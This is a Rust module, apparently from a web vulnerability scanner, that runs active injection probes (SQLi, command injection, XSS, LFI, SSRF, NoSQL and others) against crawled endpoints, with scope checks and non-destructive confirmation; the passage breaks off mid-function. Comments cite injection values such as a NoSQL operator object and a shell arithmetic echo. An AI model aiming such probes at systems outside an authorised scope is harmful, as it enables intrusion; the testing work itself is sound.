//! Active-injection oracle: fuzz discovered request parameters for SQL injection,
//! reflected XSS, OS command injection, and local file inclusion / path traversal.
//!
//! Every candidate flows through GENERATE -> DETECT -> CONFIRM -> REPORT, the same
//! correctness discipline as the template and authz engines: a hit is re-issued
//! (and, for differential/timing classes, checked against a control) before it is
//! reported. All probes are read-only and non-destructive -- SQLi/cmdi confirmation
//! is by DB-error signature, boolean/response differential, a benign `SLEEP`, or an
//! out-of-band OAST callback; never a state-changing payload.
//!
//! An injection *site* is one fuzzable location: a URL query parameter, a form-body
//! field (application/x-www-form-urlencoded), or a JSON-body field. The request the
//! target actually expects (method + body shape) is learned by the caller (form
//! parsing / OpenAPI ingestion / JS analysis) and passed in per endpoint.

use crate::engine::{AuthSpec, OastSpec};
use crate::probe::{
    self, Resp, is_server_error, json_typed, pct_decode, pct_encode, send, send_with, typed_default,
};
use cfx_finding::Finding;
use serde::Deserialize;
use serde_json::{Value, json};
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::mpsc;
use transport::Client;

#[derive(Debug, Deserialize)]
pub struct InjectParams {
    #[serde(default)]
    pub endpoints: Vec<InjEndpoint>,
    #[serde(default = "d_timeout")]
    pub timeout_ms: u64,
    #[serde(default)]
    pub target: String,
    #[serde(default = "d_true")]
    pub evasive: bool,
    #[serde(default)]
    pub identify: Option<String>,
    #[serde(default)]
    pub auth: Option<AuthSpec>,
    /// Independent sessions for the same identity, one per worker.
    ///
    /// A single session is a bottleneck on any target that locks it per
    /// request - PHP does by default - because the target then serialises the
    /// whole pass however many workers we run. Worse, a time-based payload
    /// holds that lock for five or ten seconds while everything else queues
    /// behind it and times out, and a timeout is reported as "the endpoint did
    /// not answer", so the visible symptom is missing coverage.
    ///
    /// Empty (the default) means "use `auth` for everything", which is right
    /// for a stateless credential: a bearer token has no lock to contend on.
    #[serde(default)]
    pub auth_pool: Vec<AuthSpec>,
    #[serde(default)]
    pub oast: Option<OastSpec>,
    /// Which classes to run (sqli/xss/cmdi/lfi); empty/null = all.
    #[serde(default, deserialize_with = "crate::probe::de_null_seq")]
    pub classes: Vec<String>,
    /// Endpoints probed concurrently. Same meaning as mach's and pulse's
    /// `tasks`, and clamped, because the target is someone's service.
    #[serde(default = "d_tasks")]
    pub tasks: usize,
}
fn d_timeout() -> u64 {
    12_000
}
fn d_tasks() -> usize {
    DEFAULT_TASKS
}
fn d_true() -> bool {
    true
}
fn d_get() -> String {
    "GET".to_string()
}
fn d_form() -> String {
    "form".to_string()
}

#[derive(Debug, Deserialize, Clone)]
pub struct BodyField {
    pub name: String,
    #[serde(default)]
    pub value: String,
    /// Declared JSON type (from a spec): "string" | "integer" | "number" | "boolean" | "array" |
    /// "object". Lets the JSON body keep this field's baseline value well-typed so the request
    /// stays valid and the injection actually reaches the code, instead of the server rejecting a
    /// stringified number up front. `None` => treat as string.
    #[serde(default, rename = "type")]
    pub ty: Option<String>,
}

#[derive(Debug, Deserialize, Clone)]
pub struct InjEndpoint {
    #[serde(default = "d_get")]
    pub method: String,
    pub url: String,
    /// Query param names to fuzz. Empty = every query param present in `url`.
    #[serde(default)]
    pub params: Vec<String>,
    /// Body fields to fuzz (their baseline values keep the request well-formed).
    #[serde(default)]
    pub body: Vec<BodyField>,
    /// "form" (x-www-form-urlencoded) or "json".
    #[serde(default = "d_form")]
    pub body_type: String,
    /// Path segments that are parameters rather than fixed route text.
    ///
    /// This is the strongest signal available and it comes from a contract: an
    /// OpenAPI `{id}`, or an operation in the asset graph whose request shape
    /// records the segment as a variable. Accepts either a 0-based segment
    /// index, or the segment's text (with or without `{}`), because callers
    /// have one or the other depending on where the endpoint came from.
    #[serde(default)]
    pub path_params: Vec<Value>,
}

const SLEEP_SECS: u64 = 5;
const SLEEP_THRESHOLD_MS: u128 = 3800;
// Two large coprime factors for the reflected-cmdi echo oracle. Their product is a distinctive
// 11-digit number that appears in the response only if a shell evaluated `$((A*B))`; the literal
// payload never contains it. Chosen so the product is unlikely to occur naturally in any page.
const CMDI_ECHO_A: u64 = 199_933;
const CMDI_ECHO_B: u64 = 314_573;
const MAX_ENDPOINTS: usize = 300;
/// Endpoints probed at once. Injection is request-bound, not CPU-bound, and one
/// endpoint at a time meant a scan of a few dozen endpoints across every class
/// took long enough that callers capped it and lost coverage instead. Kept low
/// by default: a target being scanned is someone's production service.
const DEFAULT_TASKS: usize = 6;

/// Dedupe keys shared across the concurrent endpoint workers, for the checks
/// that are a property of a service or a path family rather than of one
/// endpoint (shadow versions, rate limiting, CORS, XML).
/// A finding that is built and waiting on an out-of-band callback.
///
/// Blind out-of-band detection used to block: every injection point registered
/// its own correlation, fired its payloads, then slept and polled four times
/// before giving up. Against a target with no shell - which is almost every
/// injection point on almost every target - that is several seconds of waiting
/// per point for a callback that will never come, and it dominated scan time.
/// A 45-endpoint application spent an hour idle, talking to the callback
/// service rather than to the target.
///
/// Nothing about out-of-band detection needs that wait. The callback only has
/// to arrive before the scan reports. So the payloads go out carrying a marker
/// that identifies the point that sent them, the finding is built and parked
/// here, and one poll at the end of the pass decides which of them fired.
pub struct PendingOob {
    /// The per-payload label inside the callback hostname.
    pub marker: String,
    /// Emitted verbatim if that marker calls back.
    pub finding: Value,
}

pub type OobQueue = std::sync::Mutex<Vec<PendingOob>>;

/// What makes two findings the same bug: class, path, parameter, injection
/// point. Not the URL - a routing parameter gives one sink many URLs.
///
/// Defined once because there are two emit paths. The per-site path reports as
/// it goes; the out-of-band path reports at the end of the pass when the
/// callbacks come back. Both have to answer "have we already said this?" the
/// same way, and when only the first one did, two injection points on one path
/// could each park a callback and both be reported.
pub fn finding_identity(f: &Value) -> String {
    format!(
        "{}|{}|{}|{}",
        f["vuln_class"].as_str().unwrap_or(""),
        path_only(f["url"].as_str().unwrap_or("")),
        f["param"].as_str().unwrap_or(""),
        f["location"].as_str().unwrap_or("")
    )
}

pub type SeenSet = std::sync::Mutex<HashSet<String>>;

/// True the first time this key is offered. The lock is taken and released
/// around the insert alone, never held across a request.
pub fn seen_once(seen: &SeenSet, key: String) -> bool {
    match seen.lock() {
        Ok(mut g) => g.insert(key),
        // A poisoned lock means another worker panicked; carry on rather than
        // taking the whole scan down with it.
        Err(p) => p.into_inner().insert(key),
    }
}
const MAX_SITES_PER_EP: usize = 16;

#[derive(Clone, Copy, PartialEq)]
enum Loc {
    Query,
    BodyForm,
    BodyJson,
    Path,
    Header,
}

/// One fuzzable location on one endpoint.
struct Site {
    method: String,
    url: String, // full URL (query included)
    loc: Loc,
    param: String,      // the field/param being fuzzed (segment for Path)
    base_value: String, // its baseline value (keeps the request valid)
    // baseline body fields (for body sites): (name, value, declared JSON type)
    body: Vec<(String, String, Option<String>)>,
    path_idx: usize, // which path segment (Loc::Path only)
}

impl Site {
    /// Render (url, optional (body, content-type)) with `param` set to `value`.
    fn render(&self, value: &str) -> (String, Option<(String, &'static str)>) {
        match self.loc {
            Loc::Query => (set_param(&self.url, &self.param, value), None),
            Loc::Path => (set_path_seg(&self.url, self.path_idx, value), None),
            // Header sites keep the URL + body untouched; the payload rides in a request header
            // instead (see `header_override`).
            Loc::Header => (self.url.clone(), None),
            Loc::BodyForm => {
                let body = self
                    .body
                    .iter()
                    .map(|(k, v, _)| {
                        let vv = if k == &self.param { value } else { v.as_str() };
                        format!("{}={}", pct_encode(k), pct_encode(vv))
                    })
                    .collect::<Vec<_>>()
                    .join("&");
                (
                    self.url.clone(),
                    Some((body, "application/x-www-form-urlencoded")),
                )
            }
            Loc::BodyJson => {
                let mut obj = serde_json::Map::new();
                for (k, v, ty) in &self.body {
                    // The FUZZED field carries the payload verbatim as a string (that is the
                    // injection). Every OTHER field is emitted with its declared JSON type so the
                    // body validates and the request reaches the code under test.
                    let jv = if k == &self.param {
                        Value::String(value.to_string())
                    } else {
                        json_typed(v, ty.as_deref())
                    };
                    obj.insert(k.clone(), jv);
                }
                (
                    self.url.clone(),
                    Some((Value::Object(obj).to_string(), "application/json")),
                )
            }
        }
    }
    /// Render a JSON body where the fuzzed field carries a RAW JSON value (e.g. an operator object
    /// `{"$gt":""}`) rather than a string. Used by the NoSQL probe. `None` unless this is a JSON body.
    fn render_body_json_raw(&self, raw: &Value) -> Option<(String, &'static str)> {
        if self.loc != Loc::BodyJson {
            return None;
        }
        let mut obj = serde_json::Map::new();
        for (k, v, ty) in &self.body {
            let jv = if k == &self.param {
                raw.clone()
            } else {
                json_typed(v, ty.as_deref())
            };
            obj.insert(k.clone(), jv);
        }
        Some((Value::Object(obj).to_string(), "application/json"))
    }

    /// Request headers this site overrides for its payload. Empty for URL/body sites; for a Header
    /// site it carries the payload in the named request header.
    fn header_override(&self, value: &str) -> Vec<(String, String)> {
        match self.loc {
            Loc::Header => vec![(self.param.clone(), value.to_string())],
            _ => Vec::new(),
        }
    }
    fn where_label(&self) -> String {
        match self.loc {
            Loc::Query => format!("query parameter `{}`", self.param),
            Loc::BodyForm | Loc::BodyJson => format!("body parameter `{}`", self.param),
            Loc::Path => format!("URL path segment `{}`", self.param),
            Loc::Header => format!("request header `{}`", self.param),
        }
    }
}

pub async fn run(params: InjectParams, tx: mpsc::UnboundedSender<Value>) {
    let _ = tx.send(json!({"type":"ack","target": params.target}));
    if params.endpoints.is_empty() {
        let _ = tx.send(json!({"type":"error","message":"injection testing needs at least one endpoint (run a crawl first, or provide endpoints)"}));
        let _ = tx.send(json!({"type":"done","found":0}));
        return;
    }
    // Injection probes send a benign SLEEP, so the timeout floor must clear it.
    let client = match probe::build_client(
        params.evasive,
        params.identify.clone(),
        params.auth.as_ref(),
        &params.target,
        params.timeout_ms,
        // Room for the DOUBLED sleep the time-based oracle uses to prove the
        // delay tracks the number we asked for. Sized for one sleep, the
        // confirming request times out and every real time-based finding is
        // lost with the false ones.
        SLEEP_SECS * 2 * 1000 + 3000,
    ) {
        Some(c) => c,
        None => {
            let _ = tx.send(json!({"type":"error","message":"client build failed"}));
            return;
        }
    };
    // One client per session in the pool. Workers take one each, so two workers
    // never contend on the same server-side session lock.
    let session_clients: Vec<Client> = params
        .auth_pool
        .iter()
        .skip(1)
        .filter_map(|a| {
            probe::build_client(
                params.evasive,
                params.identify.clone(),
                Some(a),
                &params.target,
                params.timeout_ms,
                SLEEP_SECS * 2 * 1000 + 3000,
            )
        })
        .collect();
    if !session_clients.is_empty() {
        let _ = tx.send(json!({
            "type": "log",
            "message": format!(
                "{} independent sessions in use, so workers do not queue behind one another on the \
                 target's session lock",
                session_clients.len() + 1
            )
        }));
    }

    // A redirect-following client hides the 3xx + Location the open-redirect oracle needs, so build a
    // second client with redirects disabled just for that probe.
    let client_nr = probe::build_client_no_redirect(
        params.evasive,
        params.identify.clone(),
        params.auth.as_ref(),
        &params.target,
        params.timeout_ms,
    );
    let oast = match &params.oast {
        Some(s) if !s.domains.is_empty() && !s.api_url.is_empty() => {
            crate::oast::OastClient::from_spec(s.domains.clone(), &s.api_url)
        }
        _ => crate::oast::OastClient::from_env(),
    };

    let total = params.endpoints.len().min(MAX_ENDPOINTS) as i64;

    // Positions the corpus proves variable, computed once over every endpoint
    // we were given rather than per endpoint: the evidence for `/users/alice`
    // lives in `/users/bob`, which is a different endpoint.
    let varying = Arc::new(varying_path_indices(&params.endpoints));
    // Dedupe keys for the checks that belong to a service or a path family
    // rather than to one endpoint.
    let inv_seen: Arc<SeenSet> = Arc::new(SeenSet::default());
    let rl_seen: Arc<SeenSet> = Arc::new(SeenSet::default());
    let cors_seen: Arc<SeenSet> = Arc::new(SeenSet::default());
    // One bug, reported once. A routing parameter gives the same sink many
    // URLs - Mutillidae's hints-page-wrapper.php answers on a dozen values of
    // `level1HintIncludeFile`, all reaching one query - and reporting the same
    // SQL injection once per value is noise that buries the rest.
    let found_seen: Arc<SeenSet> = Arc::new(SeenSet::default());
    // ONE out-of-band correlation for the whole pass, and one queue of findings
    // waiting on it. Registering per injection point, then blocking on four
    // polls each, is what made a 45-endpoint scan take an hour while the target
    // sat idle at 0.09% CPU.
    // Registration is now a single point of failure for the whole pass, where
    // before every probe registered its own and a transient failure cost only
    // that probe. So retry it, and if it still fails, SAY SO. A scanner that
    // quietly stops testing a whole class is the worst failure mode there is:
    // the report looks the same as a clean one.
    let mut oob_reg: Option<Arc<crate::oast::OastReg>> = None;
    if let Some(oc) = oast.as_ref() {
        for attempt in 0..3 {
            if let Some(r) = oc.register(&client).await {
                oob_reg = Some(Arc::new(r));
                break;
            }
            if attempt < 2 {
                tokio::time::sleep(Duration::from_millis(500 << attempt)).await;
            }
        }
        if oob_reg.is_none() {
            let _ = tx.send(json!({
                "type": "log",
                "message": "out-of-band callbacks are UNAVAILABLE (registration failed after 3 \
                            attempts). Blind command injection, blind SSRF and blind XXE cannot be \
                            confirmed in this run; their absence from the results is not evidence."
            }));
        }
    }
    let oob_queue: Arc<OobQueue> = Arc::new(OobQueue::default());
    crate::probe::meter::reset();
    let xml_seen: Arc<SeenSet> = Arc::new(SeenSet::default());
    let classes = Arc::new(
        params
            .classes
            .iter()
            .map(|c| c.to_lowercase())
            .collect::<Vec<String>>(),
    );
    let oast = oast.map(Arc::new);
    let mut tasks = params.tasks.clamp(1, 16);

    let mut found = 0i64;
    let mut done = 0i64;
    let mut spawned: usize = 0;
    let mut set: tokio::task::JoinSet<(InjEndpoint, EndpointOutcome)> = tokio::task::JoinSet::new();
    // Endpoints the target stopped answering while the pass was at full width.
    // Retried one at a time afterwards rather than written off: the failure is
    // a statement about how hard we were pushing, not about the endpoint.
    let mut starved: Vec<InjEndpoint> = Vec::new();
    let mut retrying = false;
    let mut queue = params
        .endpoints
        .iter()
        .take(MAX_ENDPOINTS)
        .cloned()
        .collect::<std::collections::VecDeque<_>>();

    loop {
        while set.len() < tasks {
            let Some(ep) = queue.pop_front() else { break };
            if !in_scope(&params.target, &ep.url) {
                let _ = tx.send(json!({
                    "type": "log",
                    "message": format!(
                        "skipping {} - not on the scan target's host ({}). Active payloads are \
                         never sent off-scope.",
                        ep.url, params.target
                    )
                }));
                done += 1;
                continue;
            }
            // Round-robin the sessions so consecutive workers land on
            // different ones.
            let worker_client = if session_clients.is_empty() {
                client.clone()
            } else {
                let n = session_clients.len() + 1;
                match spawned % n {
                    0 => client.clone(),
                    k => session_clients[k - 1].clone(),
                }
            };
            spawned += 1;
            let ctx = EndpointCtx {
                client: worker_client,
                client_nr: client_nr.clone(),
                oast: oast.clone(),
                oob_reg: oob_reg.clone(),
                oob_queue: Arc::clone(&oob_queue),
                varying: Arc::clone(&varying),
                classes: Arc::clone(&classes),
                unauthenticated: params.auth.is_none(),
                inv_seen: Arc::clone(&inv_seen),
                rl_seen: Arc::clone(&rl_seen),
                cors_seen: Arc::clone(&cors_seen),
                found_seen: Arc::clone(&found_seen),
                xml_seen: Arc::clone(&xml_seen),
                tx: tx.clone(),
            };
            set.spawn(async move {
                let ep2 = ep.clone();
                (ep2, run_endpoint(ep, ctx).await)
            });
        }
        match set.join_next().await {
            Some(Ok((ep, outcome))) => {
                found += outcome.found;
                done += 1;
                if outcome.starved && !retrying {
                    starved.push(ep);
                }
            }
            Some(Err(_)) => done += 1,
            None => {
                if !starved.is_empty() && !retrying {
                    // Second pass, single file, so a target that could not keep
                    // up with eight workers gets a fair chance.
                    retrying = true;
                    tasks = 1;
                    let _ = tx.send(json!({
                        "type": "log",
                        "message": format!(
                            "{} endpoint(s) stopped answering under load; retrying them one at a \
                             time",
                            starved.len()
                        )
                    }));
                    queue.extend(starved.drain(..));
                    continue;
                }
                break;
            }
        }
        if done % 3 == 0 || done == total {
            let _ = tx.send(json!({"type":"progress","processed":done,"total":total}));
        }
    }

    // Out-of-band callbacks, collected once. Everything that was going to call
    // back has had the whole pass to do it; this is the grace period for a
    // target that queues its outbound requests, not a per-payload wait.
    if let (Some(oc), Some(reg)) = (oast.as_ref(), oob_reg.as_ref()) {
        let pending: Vec<PendingOob> = oob_queue
            .lock()
            .map(|mut v| std::mem::take(&mut *v))
            .unwrap_or_default();
        if !pending.is_empty() {
            let _ = tx.send(json!({
                "type": "log",
                "message": format!(
                    "{} out-of-band payload(s) sent; polling once for callbacks",
                    pending.len()
                )
            }));
            let mut hosts: Vec<String> = Vec::new();
            for wait in [0u64, 2000, 4000] {
                if wait > 0 {
                    tokio::time::sleep(Duration::from_millis(wait)).await;
                }
                hosts = oc.poll_hosts(&client, reg).await;
                if !hosts.is_empty() {
                    break;
                }
            }
            for p in pending {
                if hosts.iter().any(|h| h.contains(&p.marker))
                    && seen_once(&found_seen, finding_identity(&p.finding))
                {
                    let _ = tx.send(json!({"type":"finding","data": p.finding}));
                    found += 1;
                }
            }
        }
        oc.deregister(&client, reg).await;
    }

    // What this pass cost, in the operator's terms. A scan that takes an hour
    // is a defect; a scan that took an hour because it sent 41,000 requests is
    // a capacity decision. Only one of those can be acted on, and until this
    // was reported the difference was a guess.
    {
        let (reqs, wait_ms, pace_ms, fails) = crate::probe::meter::snapshot();
        if reqs > 0 {
            let _ = tx.send(json!({
                "type": "log",
                "message": format!(
                    "injection pass: {reqs} requests, {}s waiting on the target, {}s pacing \
                     back-off, {fails} that never answered",
                    wait_ms / 1000,
                    pace_ms / 1000
                )
            }));
        }
    }

    let _ = tx.send(json!({"type":"done","found":found}));
}

/// Hosts an injection pass is allowed to touch.
///
/// A crawl of Mutillidae picked up a donate form whose action is
/// `https://www.paypal.com/cgi-bin/webscr`, that endpoint reached this engine,
/// and it sent SQL injection payloads to PayPal. Nothing downstream of the
/// crawler was checking, so a single off-site form action was enough to point
/// active probes at a third party's production service.
///
/// The scan target now defines the scope. An endpoint on another host is
/// skipped and said out loud. When no target is given the caller is trusted,
/// because that is an explicit endpoint list from an operator rather than
/// something a crawl produced.
fn in_scope(target: &str, url: &str) -> bool {
    let scope = host_of(target);
    if scope.is_empty() {
        return true;
    }
    let host = host_of(url);
    if host.is_empty() || host == scope {
        return true;
    }
    // A port difference on the same name is the same service to an operator who
    // named the host; a different name is not.
    let bare = |h: &str| h.split(':').next().unwrap_or(h).to_string();
    bare(&host) == bare(&scope)
}

/// Everything one endpoint worker needs. Cloned per endpoint; the clients are
/// connection-pool handles and the sets are shared behind a mutex, so this is
/// cheap.
struct EndpointCtx {
    client: Client,
    client_nr: Option<Client>,
    oast: Option<Arc<crate::oast::OastClient>>,
    /// One correlation for the whole pass. Every out-of-band payload rides it,
    /// tagged with its own marker, and a single poll at the end sorts them out.
    oob_reg: Option<Arc<crate::oast::OastReg>>,
    oob_queue: Arc<OobQueue>,
    varying: Arc<VaryingPaths>,
    classes: Arc<Vec<String>>,
    /// Whether this scan is running without credentials. The public-exposure
    /// oracle's whole claim is "an anonymous caller gets this", so it must not
    /// run when the request carries a session.
    unauthenticated: bool,
    inv_seen: Arc<SeenSet>,
    rl_seen: Arc<SeenSet>,
    cors_seen: Arc<SeenSet>,
    found_seen: Arc<SeenSet>,
    xml_seen: Arc<SeenSet>,
    tx: mpsc::UnboundedSender<Value>,
}

/// What one endpoint's pass produced.
struct EndpointOutcome {
    found: i64,
    /// Every site was skipped because the target stopped answering. That is a
    /// statement about load, not about the endpoint, so the driver retries it.
    starved: bool,
}

/// Probe one endpoint end to end.
async fn run_endpoint(ep: InjEndpoint, ctx: EndpointCtx) -> EndpointOutcome {
    let EndpointCtx {
        client,
        client_nr,
        oast,
        oob_reg,
        oob_queue,
        varying,
        classes,
        unauthenticated,
        inv_seen,
        rl_seen,
        cors_seen,
        found_seen,
        xml_seen,
        tx,
    } = ctx;
    let want = |c: &str| classes.is_empty() || classes.iter().any(|x| x == c);
    let oast = oast.as_deref();
    let mut found = 0i64;
    let mut sites = 0usize;
    let mut starved = 0usize;
    if want("inventory") {
        for f in probe_inventory(&client, &ep, &inv_seen).await {
            let _ = tx.send(json!({"type":"finding","data":f}));
            found += 1;
        }
    }
    if want("ratelimit") {
        if let Some(f) = probe_ratelimit(&client, &ep, &rl_seen).await {
            let _ = tx.send(json!({"type":"finding","data":f}));
            found += 1;
        }
    }
    if want("cors") {
        if let Some(f) = probe_cors(&client, &ep, &cors_seen).await {
            let _ = tx.send(json!({"type":"finding","data":f}));
            found += 1;
        }
    }
    if want("xxe") {
        for f in crate::xml::probe(
            &client,
            &ep.method,
            &ep.url,
            oast,
            oob_reg.as_deref(),
            Some(&oob_queue),
            &xml_seen,
        )
        .await
        {
            let _ = tx.send(json!({"type":"finding","data":f}));
            found += 1;
        }
    }
    // Personal data served to a caller who never authenticated. Only meaningful
    // when the scan itself holds no credentials, which is what
    // `unauthenticated` records.
    if want("exposure") && unauthenticated {
        let alts: Vec<(usize, Vec<String>)> = varying
            .get(&format!("{}{}", host_of(&ep.url), path_only(&ep.url)))
            .map(|m| m.iter().map(|(i, v)| (*i, v.clone())).collect())
            .unwrap_or_default();
        let declared = declared_path_indices(&ep);
        if let Some(f) =
            crate::exposure::probe(&client, &ep.method, &ep.url, &alts, &declared).await
        {
            let _ = tx.send(json!({"type":"finding","data":f}));
            found += 1;
        }
    }
    for site in sites_for(&ep, &varying) {
        // Every oracle on this site compares against the baseline, so losing it
        // loses the site - silently, which is the problem. One timed-out
        // request was enough to drop a whole endpoint, and on a target being
        // hit by time-based probes on other workers that happens: PHP's worker
        // pool is finite and a few five-second sleeps exhaust it.
        //
        // Retry before giving up, and when it still fails, say which endpoint
        // was skipped instead of leaving a hole that reads as "nothing here".
        let mut baseline = None;
        for attempt in 0..3 {
            if attempt > 0 {
                tokio::time::sleep(Duration::from_millis(500 * attempt)).await;
            }
            if let Some(r) = send_site(&client, &site, &site.base_value).await {
                baseline = Some(r);
                break;
            }
        }
        sites += 1;
        let Some(baseline) = baseline else {
            starved += 1;
            let _ = tx.send(json!({
                "type": "log",
                "message": format!(
                    "skipped {} {} ({}): the endpoint did not answer a baseline request after 3 \
                     attempts, so no oracle could run against it",
                    site.method, site.url, site.where_label()
                )
            }));
            continue;
        };
        // One injection point can be more than one kind of sink: PHP's
        // include() takes a local path AND a URL, so the same parameter is both
        // LFI and SSRF, with different severities and different fixes. Every
        // class runs.
        //
        // A cap of four confirmed classes per point used to sit here, meant to
        // stop an endpoint that executes everything from burning requests. It
        // was a guess, and it reintroduced the exact bug it was written beside:
        // Mutillidae's `?page=` confirms SQLi, XSS, command injection and SSRF
        // before the LFI probe is reached, so the file read - the most severe of
        // the five - was cut off by the cap and looked like a detection failure.
        // Cost is already bounded by the concurrency limit and by each probe's
        // own request budget. Hiding findings is not an acceptable way to buy
        // time.
        let mut hits = 0usize;
        let emit = |f: Value, hits: &mut usize| {
            if !seen_once(&found_seen, finding_identity(&f)) {
                return;
            }
            let _ = tx.send(json!({"type":"finding","data":f}));
            *hits += 1;
        };
        if want("sqli") {
            if let Some(f) = probe_sqli(&client, &site, &baseline).await {
                emit(f, &mut hits);
            }
        }
        if want("cmdi") {
            if let Some(f) =
                probe_cmdi(&client, &site, oast, oob_reg.as_deref(), Some(&oob_queue)).await
            {
                emit(f, &mut hits);
            }
        }
        if want("ssrf") {
            if let Some(f) = probe_ssrf(
                &client,
                client_nr.as_ref(),
                &site,
                oast,
                oob_reg.as_deref(),
                Some(&oob_queue),
            )
            .await
            {
                emit(f, &mut hits);
            }
        }
        if want("xss") {
            if let Some(f) = probe_xss(&client, &site).await {
                emit(f, &mut hits);
            }
        }
        if want("lfi") {
            if let Some(f) = probe_lfi(&client, &site, &baseline).await {
                emit(f, &mut hits);
            }
        }
        if want("ssti") {
            if let Some(f) = probe_ssti(&client, &site).await {
                emit(f, &mut hits);
            }
        }
        if want("crlf") {
            if let Some(f) = probe_crlf(&client, &site).await {
                emit(f, &mut hits);
            }
        }
        if want("nosql") {
            if let Some(f) = probe_nosql(&client, &site, &baseline).await {
                emit(f, &mut hits);
            }
        }
        if want("open_redirect") {
            if let Some(nr) = client_nr.as_ref() {
                if let Some(f) = probe_open_redirect(nr, &site).await {
                    emit(f, &mut hits);
                }
            }
        }
        found += hits as i64;
    }
    EndpointOutcome {
        found,
        starved: sites > 0 && starved == sites,
    }
}

/// Expand an endpoint into its fuzzable sites (query params, path segments,
/// body fields). `varying` carries the positions the corpus proved variable.
fn sites_for(ep: &InjEndpoint, varying: &VaryingPaths) -> Vec<Site> {
    let method = ep.method.to_uppercase();
    let mut out = Vec::new();
    let qnames: Vec<String> = if ep.params.is_empty() {
        query_param_names(&ep.url)
    } else {
        ep.params.clone()
    };
    for name in qnames {
        let base = current_value(&ep.url, &name).unwrap_or_else(|| "1".to_string());
        out.push(Site {
            method: method.clone(),
            url: ep.url.clone(),
            loc: Loc::Query,
            param: name,
            base_value: base,
            body: Vec::new(),
            path_idx: 0,
        });
    }
    // Path segments carrying a value rather than route text. REST APIs put the
    // object key in the path (/users/{id}, /orgs/{slug}), so this reaches
    // injection that query and body fuzzing structurally cannot.
    //
    // Three sources of truth, strongest first:
    //   1. the endpoint declares them (OpenAPI `{id}`, or the asset graph's
    //      recorded request shape)
    //   2. the corpus shows the position varying between otherwise identical
    //      paths, which catches `/users/alice` where no heuristic would
    //   3. the segment merely looks like an identifier
    //
    // The third is a guess and is used only when the first two say nothing,
    // because a guess that fires on every wordy segment costs requests and
    // credibility on real targets.
    let path = path_only(&ep.url);
    let declared = declared_path_indices(ep);
    let observed: Vec<usize> = varying
        .get(&format!("{}{}", host_of(&ep.url), path))
        .map(|m| m.keys().copied().collect())
        .unwrap_or_default();
    let have_evidence = !declared.is_empty() || !observed.is_empty();
    for (i, seg) in path.split('/').enumerate() {
        if seg.is_empty() {
            continue;
        }
        let is_param = declared.contains(&i)
            || observed.contains(&i)
            || (!have_evidence && looks_like_id_seg(seg));
        if is_param {
            out.push(Site {
                method: method.clone(),
                url: ep.url.clone(),
                loc: Loc::Path,
                param: seg.to_string(),
                base_value: seg.to_string(),
                body: Vec::new(),
                path_idx: i,
            });
        }
    }
    if !ep.body.is_empty() {
        let loc = if ep.body_type.eq_ignore_ascii_case("json") {
            Loc::BodyJson
        } else {
            Loc::BodyForm
        };
        let body: Vec<(String, String, Option<String>)> = ep
            .body
            .iter()
            .map(|f| {
                let base = if f.value.is_empty() {
                    typed_default(f.ty.as_deref()).to_string()
                } else {
                    f.value.clone()
                };
                (f.name.clone(), base, f.ty.clone())
            })
            .collect();
        let bmethod = if method == "GET" {
            "POST".to_string()
        } else {
            method.clone()
        };
        for f in &ep.body {
            let base = body
                .iter()
                .find(|(k, _, _)| k == &f.name)
                .map(|(_, v, _)| v.clone())
                .unwrap_or_default();
            out.push(Site {
                method: bmethod.clone(),
                url: ep.url.clone(),
                loc,
                param: f.name.clone(),
                base_value: base,
                body: body.clone(),
                path_idx: 0,
            });
        }
    }
    // Request-header sites. These carry user-controlled values that back-ends routinely log or query
    // (X-Forwarded-For into an access-log INSERT, User-Agent into analytics), so they are a real SQLi /
    // injection surface that query+body fuzzing never touches. A benign baseline keeps the request
    // valid; the probes append their payloads to it. Kept to the few high-yield headers to bound cost.
    for (hname, hbase) in [
        ("X-Forwarded-For", "127.0.0.1"),
        ("User-Agent", "Mozilla/5.0"),
        ("Referer", "https://www.google.com/"),
    ] {
        out.push(Site {
            method: method.clone(),
            url: ep.url.clone(),
            loc: Loc::Header,
            param: hname.to_string(),
            base_value: hbase.to_string(),
            body: Vec::new(),
            path_idx: 0,
        });
    }

    out.truncate(MAX_SITES_PER_EP);
    out
}

/// Segment indices this endpoint declares as parameters.
fn declared_path_indices(ep: &InjEndpoint) -> Vec<usize> {
    if ep.path_params.is_empty() {
        return Vec::new();
    }
    let path = path_only(&ep.url);
    let segs: Vec<&str> = path.split('/').collect();
    let mut out = Vec::new();
    for spec in &ep.path_params {
        match spec {
            Value::Number(n) => {
                if let Some(i) = n.as_u64() {
                    if (i as usize) < segs.len() {
                        out.push(i as usize);
                    }
                }
            }
            Value::String(sv) => {
                let want = sv.trim_matches(|c| c == '{' || c == '}');
                if let Some(i) = segs.iter().position(|s| {
                    *s == sv.as_str()
                        || *s == want
                        || s.trim_matches(|c| c == '{' || c == '}') == want
                }) {
                    out.push(i);
                }
            }
            _ => {}
        }
    }
    out.sort_unstable();
    out.dedup();
    out
}

/// Path positions that demonstrably vary across the endpoint corpus.
///
/// Two requests that agree on every segment except position `i` are proof that
/// position `i` carries a value rather than route text: `/users/alice` beside
/// `/users/bob` says segment 1 is a parameter, and says it about a segment no
/// shape heuristic would ever accept, because "alice" looks exactly like a
/// static route.
///
/// This is the difference between guessing what an identifier looks like and
/// observing what actually moves. It only ever adds sites, and it says nothing
/// about positions it has not seen vary, so a corpus of one endpoint falls
/// through to the shape heuristic unchanged.
type VaryingPaths = HashMap<String, HashMap<usize, Vec<String>>>;

/// Positions the corpus proves variable, and the values seen at each. The
/// values matter as much as the positions: two different identifiers at the
/// same position are two different objects, which is what the public-exposure
/// oracle compares.
fn varying_path_indices(endpoints: &[InjEndpoint]) -> VaryingPaths {
    // key: host + segment count + the segments with position i blanked.
    let mut buckets: HashMap<(String, usize, usize, String), HashSet<String>> = HashMap::new();
    for ep in endpoints {
        let host = host_of(&ep.url);
        let path = path_only(&ep.url);
        let segs: Vec<&str> = path.split('/').collect();
        for i in 0..segs.len() {
            if segs[i].is_empty() {
                continue;
            }
            let mut masked = segs.clone();
            masked[i] = "\u{0}";
            let key = (host.clone(), segs.len(), i, masked.join("/"));
            buckets.entry(key).or_default().insert(segs[i].to_string());
        }
    }
    let mut varying: VaryingPaths = HashMap::new();
    for ((host, _len, i, masked), values) in buckets {
        if values.len() < 2 {
            continue; // one observation is not evidence of anything
        }
        let mut all: Vec<String> = values.iter().cloned().collect();
        all.sort();
        for v in &values {
            let concrete = masked.replace('\u{0}', v);
            varying
                .entry(format!("{host}{concrete}"))
                .or_default()
                .insert(i, all.clone());
        }
    }
    varying
}

fn host_of(url: &str) -> String {
    let after = url.split("://").nth(1).unwrap_or(url);
